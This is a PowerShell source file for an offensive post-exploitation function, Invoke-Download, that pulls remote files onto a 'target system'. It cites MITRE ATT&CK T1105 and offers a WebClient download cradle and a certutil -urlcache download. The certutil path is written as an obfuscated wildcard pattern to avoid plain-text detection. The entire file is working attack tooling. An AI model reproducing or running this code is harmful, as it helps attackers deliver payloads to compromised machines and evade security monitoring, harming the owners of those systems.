function Invoke-Download {

[CmdletBinding()]
param (
	[Parameter(ParameterSetName = 'help')]
	[Switch]$Help,
	
	[Parameter(ParameterSetName = 'listcommands')]
	[Switch]$List,
	
	[Parameter(ParameterSetName = 'psDownload')]
	[Switch]$PsDownload,
	[String]$RemoteFile,
	[String]$LocalFile,
	
	[Parameter(ParameterSetName = 'certutil')]
	[Switch]$Certutil,
	[String]$RemoteFile2=[string]$RemoteFile,
	[String]$LocalFile2=[string]$LocalFile
)

$Rs2 = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))

	if ($Help -eq $True) {
		
		Write @"
	
 ### DOWNLOAD HELP ###
 ---------------------
 
 Invoke-Download [-command] [-parameter(s)]
 
 Available Invoke-Download Commands:
 -----------------------------------
 /-----------------------------------------------------------------------------/
 | -PsDownload [-RemoteFile] remote_File [-LocalFile] local_file               |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Downloads a file to the target system using a             |
 |      traditional powershell 'downloadfile' cradle.                          |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                             | 
 |      (https://attack.mitre.org/techniques/T1105/)                           |	 
 |                                                                             |
 |  [*] Usage: Invoke-Download -PsDownload -RemoteFile https://server/File.exe |
 |      -LocalFile C:\temp\File.exe                                            |
 /-----------------------------------------------------------------------------/
 
 /-----------------------------------------------------------------------------/
 | -CertUtil  [-RemoteFile] remote_File [-LocalFile] local_file                |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Uses certutil to download a file to the target            |
 |      system.                                                                |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                             | 
 |      (https://attack.mitre.org/techniques/T1105/)                           |	
 |                                                                             |
 |  [*] Usage: Invoke-Download -CertUtil -RemoteFile http://server/File.exe    |
 |      -LocalFile C:\temp\File.exe                                            |
 /-----------------------------------------------------------------------------/

"@
	}
	
	elseif ($List -eq $True) {
		Write @"

 Invoke-Download Command List:
 -----------------------------
 Invoke-Download -PsDownload [-RemoteFile] remote_File [-LocalFile] local_file
 Invoke-Download -CertUtil [-RemoteFile] remote_File [-LocalFile] local_file
 
"@
	}
	
	elseif ($PsDownload -and $RemoteFile -and $LocalFile) {
		$h = "`n### Invoke-Download(PsDownload) ###`n"
		(New-Object System.Net.Webclient).downloadfile($RemoteFile, $LocalFile)
		
		$FileExists = (Test-Path -path $LocalFile)
		if ($FileExists) {
			$h
			Write " [+] File successfully downloaded to $LocalFile"
			$h
		}
		else {
			$h
			Write " [-] Download failed. Make sure your File exists at $RemoteFile and that $LocalFile is writable and try again."
			$h
		}
	}
	
	elseif ($certutil -and $RemoteFile -and $LocalFile) {
	# https://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
	# https://twitter.com/subtee/status/888125678872399873
	# https://twitter.com/subTee/status/888071631528235010
	
		$h = "`n### Invoke-Download(certutil) ###`n"
		(C:\??*?\*3?\?er*ut?l.?x? -split -urlcache -f $RemoteFile $LocalFile)
		
		$FileExists = (Test-Path -path $LocalFile)
		if ($FileExists) {
			$h
			Write " File successfully downloaded to $LocalFile"
			$h
		}
		else {
			$h
			Write " Download failed. Make sure your File exists at $RemoteFile and that $LocalFile is writable and try again."
			$h
		}
	}
}
